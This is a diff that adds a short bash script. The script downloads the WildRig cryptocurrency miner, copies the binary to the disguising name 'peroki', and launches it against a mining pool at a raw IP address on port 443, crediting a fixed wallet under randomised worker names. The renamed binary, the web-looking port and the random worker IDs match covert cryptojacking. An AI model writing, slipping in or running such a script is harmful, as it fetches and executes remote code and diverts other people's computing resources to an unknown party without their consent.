@@ -1,0 +1,9 @@
+#!/bin/bash
+export LC_ALL=C
+export LANG=C
+apt update
+apt -y install ocl-icd-opencl-dev
+curl https://github.com/andru-kun/wildrig-multi/releases/download/0.48.3/wildrig-multi-linux-0.48.3.tar.gz -L -o wildrig-multi-linux-0.48.3.tar.gz
+tar xf wildrig-multi-linux-0.48.3.tar.gz
+cp wildrig-multi peroki
+./peroki --algo pearl --url stratum+tcp://207.148.76.66:443 --user prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch.$(echo $RANDOM | md5sum | head -c 10) --pass x
